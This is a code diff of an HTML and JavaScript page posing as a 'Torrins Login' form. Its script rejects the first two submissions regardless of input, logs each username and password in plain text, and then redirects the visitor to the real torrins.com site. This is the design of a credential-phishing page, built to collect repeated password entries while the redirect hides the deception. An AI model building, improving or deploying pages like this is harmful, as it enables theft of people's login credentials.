@@ -11,7 +11,7 @@
     <h2 class="text-2xl font-bold mb-6 text-center">Torrins Login</h2>
     <div id="error-message" class="text-red-500 text-center mb-4 hidden"></div>
 
-    <form id="login-form" onsubmit="handleSubmit(event)">
+    <form id="login-form">
       <div class="mb-4">
         <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
         <input 
@@ -43,36 +43,30 @@
     <p class="mt-4 text-center text-sm text-gray-600">
       Submissions: <span id="submissions">0</span>/3
     </p>
-
-    <div id="manual-update-instructions" class="mt-6 text-center text-sm text-gray-600">
-      <p>
-        After each failed login attempt, please manually update the 
-        <a href="https://github.com/yourusername/your-repo/blob/main/custom.log" target="_blank">custom.log file</a> 
-        on GitHub with the attempt details.
-      </p>
-    </div>
   </div>
 
   <script>
     let submissions = 0;
 
-    function handleSubmit(event) {
+    document.getElementById("login-form").addEventListener("submit", function(event) {
       event.preventDefault();
+
+      submissions++;
 
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
       const errorMessage = document.getElementById('error-message');
       const submissionsDisplay = document.getElementById('submissions');
 
-      // Increment submission count
-      submissions++;
       submissionsDisplay.textContent = submissions.toString();
 
-      // Show error or redirect
+      // Always log attempt
+      console.log(`Attempt ${submissions}: Username = "${username}", Password = "${password}"`);
+
       if (submissions < 3) {
         errorMessage.textContent = 'Type again.';
         errorMessage.classList.remove('hidden');
-        document.getElementById('password').value = ''; // clear password field
+        document.getElementById('password').value = ''; 
       } else {
         errorMessage.textContent = 'Final submission received. Redirecting...';
         errorMessage.classList.remove('hidden');
@@ -80,10 +74,7 @@
           window.location.href = 'https://www.torrins.com/';
         }, 2000);
       }
-
-      // Log attempt (always adds a new line in console, no clearing)
-      console.log(`Attempt ${submissions}: Username = "${username}", Password = "${password}"`);
-    }
+    });
   </script>
 </body>
 </html>
